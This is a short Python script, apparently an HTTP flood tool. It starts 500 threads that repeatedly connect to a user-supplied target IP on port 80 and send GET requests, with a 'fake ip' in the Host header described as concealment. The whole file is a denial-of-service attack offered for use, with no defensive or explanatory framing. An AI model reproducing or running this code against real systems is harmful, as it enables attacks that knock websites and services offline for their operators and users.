import threading
import socket

target = 'Enter Target ip here'
# format: 000.00.00.00
port = 80
fake_ip = '182.43.41.40'
# fake ip to "conceal"

already_connected = 0

def attack():
    while True:
        #Creating a loop
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
